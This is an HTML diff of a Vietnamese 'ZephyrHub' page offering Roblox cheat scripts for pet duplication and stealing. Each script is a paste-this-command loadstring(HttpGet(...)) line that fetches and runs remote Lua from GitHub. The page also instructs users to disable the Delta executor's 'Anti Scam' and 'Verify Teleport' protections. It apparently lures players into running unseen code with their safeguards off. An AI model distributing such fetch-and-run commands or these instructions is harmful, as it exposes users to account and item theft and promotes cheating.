@@ -1,107 +1,75 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZephyrHub Script</title>
-    <style>
-        body {
-            background-color: #0f172a;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 40px;
-        }
-        .container {
-            background-color: #1e293b;
-            padding: 30px;
-            border-radius: 10px;
-            display: inline-block;
-            margin-top: 20px;
-        }
-        input.script-box {
-            width: 80%;
-            padding: 10px;
-            font-size: 14px;
-            margin-top: 10px;
-            margin-bottom: 10px;
-        }
-        .copy-btn {
-            background-color: #0ea5e9;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .title {
-            font-size: 36px;
-            font-weight: bold;
-            color: #3b82f6;
-            margin-bottom: 20px;
-        }
-        .instructions {
-            text-align: left;
-            margin-top: 20px;
-        }
-        .instructions p {
-            margin: 5px 0;
-        }
-        .script-section {
-            margin-bottom: 30px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>ZephyrHub Scripts</title>
+  <style>
+    body {
+      background-color: #0f172a;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    .script-box {
+      width: 80%;
+      padding: 10px;
+      font-size: 14px;
+      margin: 10px 0;
+    }
+    .copy-btn {
+      background-color: #0ea5e9;
+      color: white;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .title {
+      font-size: 36px;
+      color: #3b82f6;
+      margin-bottom: 30px;
+    }
+  </style>
 </head>
 <body>
-    <div class="title">ZephyrHub</div>
 
-    <div class="container">
-        <!-- SCRIPT 1: Grow A Garden -->
-        <div class="script-section">
-            <h3>🌱 Script Grow A Garden</h3>
-            <input class="script-box" type="text" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/NoLag-DupePet/refs/heads/main/Main.lua"))()' readonly>
-            <br>
-            <button class="copy-btn" onclick="copyText(this)">📋 Copy Script</button>
-        </div>
+  <div class="title">ZephyrHub Scripts</div>
 
-        <!-- SCRIPT 2: Steal A Brainrot -->
-        <div class="script-section">
-            <h3>🧠 Script Steal A Brainrot</h3>
-            <input class="script-box" type="text" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/FarmEvent-StealPet/refs/heads/main/Steal%20A%20Brainrot"))()' readonly>
-            <br>
-            <button class="copy-btn" onclick="copyText(this)">📋 Copy Script</button>
-        </div>
+  <!-- Script 1: Grow A Garden -->
+  <h3>🌱 Script Grow A Garden</h3>
+  <input class="script-box" type="text" id="script1" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/NoLag-DupePet/refs/heads/main/Main.lua"))()' readonly>
+  <br>
+  <button class="copy-btn" onclick="copyScript('script1')">📋 Copy Script</button>
 
-        <!-- Hướng dẫn sử dụng -->
-        <div class="instructions">
-            <h4>📘 Hướng dẫn sử dụng</h4>
-            <p>✅ Sử dụng bất cứ executor nào bạn muốn.</p>
-            <p>✅ Bật lên và sử dụng như bình thường.</p>
+  <!-- Script 2: Steal A Brainrot -->
+  <h3>🧠 Script Steal A Brainrot</h3>
+  <input class="script-box" type="text" id="script2" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/FarmEvent-StealPet/refs/heads/main/Steal%20A%20Brainrot"))()' readonly>
+  <br>
+  <button class="copy-btn" onclick="copyScript('script2')">📋 Copy Script</button>
 
-            <p style="color: yellow;"><strong>Nếu bạn sử dụng DELTA (rất quan trọng):</strong></p>
-            <ul>
-                <li>Bước 1: Ấn vào logo Delta.</li>
-                <li>Bước 2: Ấn vào Setting (bánh răng).</li>
-                <li>Bước 3: Tắt Anti Scam (để dùng Steal, Fake Trade, Freeze Trade và Spawner).</li>
-                <li>Bước 4: Tắt Verify Teleport (mấu chốt để sử dụng tất cả chức năng, nếu không tắt sẽ bị mất data).</li>
-            </ul>
-            <p>💻 Sau đó execute script và tận hưởng 😎</p>
-        </div>
+  <h3 style="margin-top: 40px;">📘 Hướng dẫn sử dụng (cho Delta)</h3>
+  <div style="text-align: left; display: inline-block; text-align: left;">
+    <ul>
+      <li>Bước 1: Mở logo Delta</li>
+      <li>Bước 2: Vào phần cài đặt (Setting)</li>
+      <li>Bước 3: Tắt <strong>Anti Scam</strong></li>
+      <li>Bước 4: Tắt <strong>Verify Teleport</strong></li>
+    </ul>
+    <p>✅ Sau đó dán script và tận hưởng!</p>
+  </div>
 
-        <p style="margin-top: 20px;">© 2025 ZephyrHub</p>
-    </div>
+  <script>
+    function copyScript(id) {
+      const input = document.getElementById(id);
+      navigator.clipboard.writeText(input.value).then(() => {
+        alert("✅ Script đã được copy!");
+      }).catch(err => {
+        alert("❌ Không thể copy. Trình duyệt không cho phép!");
+        console.error(err);
+      });
+    }
+  </script>
 
-    <script>
-        function copyText(button) {
-            var input = button.previousElementSibling;
-            input.select();
-            input.setSelectionRange(0, 99999); // For mobile devices
-            document.execCommand("copy");
-            button.textContent = "✅ Đã Copy!";
-            setTimeout(() => {
-                button.textContent = "📋 Copy Script";
-            }, 2000);
-        }
-    </script>
 </body>
 </html>
